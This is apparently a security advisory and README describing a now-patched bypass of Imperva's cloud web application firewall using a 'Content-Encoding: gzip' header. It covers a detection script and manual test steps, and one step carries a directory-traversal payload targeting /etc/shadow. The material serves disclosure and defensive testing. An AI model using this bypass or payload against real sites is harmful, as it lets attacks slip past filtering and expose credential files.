# Imperva Web Application Firewall (WAF) POST Request Bypass 
Imperva Cloud WAF was vulnerable to a bypass that allows attackers to evade WAF rules when sending malicious HTTP POST payloads, such as log4j exploits, SQL injection, command execution, directory traversal, XXE, etc.

## Remediation
The Imperva team took this very seriously from the minute it was reported to them, and they turned around a global fix in just a few days. Kudos. All customers of Cloud WAF are automatically patched as of December 22, 2021. Imperva were great to work with and clearly have a mature, skilled, and capable security team.

## To Exploit It
Add the header `Content-Encoding: gzip` to HTTP POST requests. Leave POST data as-is. Don't encode it. So long as the first four bytes of the `Content-Encoding` header are `gzip`, no WAF rules will be applied to POST requests.

You can do this in Burp by using the proxy's Match & Replace feature:

![](https://i.imgur.com/bNPA1MW.png)

Add a new header like this:

![](https://i.imgur.com/fJtQ8A1.png)

That's it; you're good to go.

# Running the Test Script
Run `imperva_gzip.py` against a URL that supports POST requests like this:

Syntax:
	`./imperva_gzip.py [[-t] | [-r]] URL`

Guess the WAF type for a given URL:
```
$ ./imperva_gzip.py -t https://www.vulnerable.com/search
Imperva Incapsula
$ ./imperva_gzip.py -t https://www.wordpress-user.com/login
WordFence
$ ./imperva_gzip.py -t https://www.cloudflare-customer.com
Cloudflare
```

Check to see if the WAF is vulnerable to the gzip bypass:
```
$ ./imperva_gzip.py https://www.vulnerable.com/search
[+] Can we make POST requests to https://www.vulnerable.com/search?
[+] Checking for Imperva WAF...
[+] Attempting gzip bypass for UNIX trigger...
[+] Vulnerable! HTTP response code: 200
[+] Attempting gzip bypass for Windows trigger...
[+] Vulnerable! HTTP response code: 200
```

If you get this error:
```
$ ./imperva_gzip.py https://www.vulnerable.com/search
[+] Can we make POST requests to https://www.vulnerable.com/search?
[!] Can't POST to https://www.vulnerable.com/search. Try -r if 30x redirects are allowed. HTTP response code: 302
```

then try passing `-r` on the command line to enable relaxed mode. Relaxed mode is off by default, which means a POST request is expected to elicit an HTTP 200 response from the server. `-r` expands the acceptable responses to HTTP 2xx, 3xx.

## Scripting
The exit codes for `imperva_gzip.py` are as follows:

```
0: Returned after getting WAF type.
1: Command-line was invalid.
2: There was an error connecting. Could be DNS error, timeout, etc.
3: No WAF was detected; malicious UNIX/Windows payloads weren't blocked.
4: A WAF was detected, but it wasn't Imperva.
5: The server responded to a test POST request with something other than HTTP 200.
128: There is an Imperva WAF, but it is not vulnerable to the gzip bypass.
129: The bypass was effective for the UNIX payload, but not the Windows one.
130: The bypass was effective for the Windows payload, but not the UNIX one.
131: The bypass was effective against both Windows and UNIX payloads.
```

## Process to Manually Test for Vulnerability
Send three POST requests:

1. Establish a baseline POST request/response with a valid but harmless POST request
2. Trigger the Imperva WAF using the same POST request, but with extra “malicious” data such as `&test=../../../../../../../etc/shadow` in the body to verify that Imperva blocks it
3. Add the header `Content-Encoding: gzip` to the same malicious request and verify that Imperva doesn't block it

## Other Encodings
According to https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Encoding, there are four valid values for the `Content-Encoding` header:

* `compress`
* `deflate`
* `gzip`
* `br`

In testing, only `gzip` worked as a bypass.

## Affected Versions
### Imperva Cloud WAF
Cloud WAF is managed by Imperva. As as result, updates to Cloud WAF affect almost all customers at almost the same time. It is patched for all customers as of December 22, 2021.

## SecureSphere
The `gzip` bypass bug has been remediated in a separate Imperva product called SecureSphere. The [release notes for v12.6 of SecureSphere](https://docs.imperva.com/bundle/v12.6-release-notes/page/64973.htm) contain this paragraph:

> SPHR-58185: When SecureSphere failed to decompress POST body in requests with "Content-Encoding: gzip/deflate" header, it issued no alert and let the request through.

I'm pretty sure this is the same bug, perhaps with the same code heritage as Cloud WAF... it's a pretty specific bug to be in two products. The issue was resolved for SecureSphere in February 2021, but we don't know when it was introduced. It's possible that the vulnerability has been there for years!

## Contact
### Bishop Fox
* Author: [@carllivitt](https://twitter.com/carllivitt) [@bishopfox](https://twitter.com/bishopfox)
* Offensive Security: [Bishop Fox](https://bishopfox.com/)
* Continuous Offensive Security: [Bishop Fox Cosmos](https://bishopfox.com/platform)
* Mad Scientists: [Bishop Fox Labs](https://bishopfox.com/labs)

### Imperva
Imperva Customer Support: https://www.imperva.com/support/technical-support/

## References
* [Imperva Cloud WAF](https://www.imperva.com/products/web-application-firewall-waf/)
* [Imperva SecureSphere 12.6 release notes](https://docs.imperva.com/bundle/v12.6-release-notes/page/64973.htm)
* [Content-Encoding HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Encoding)
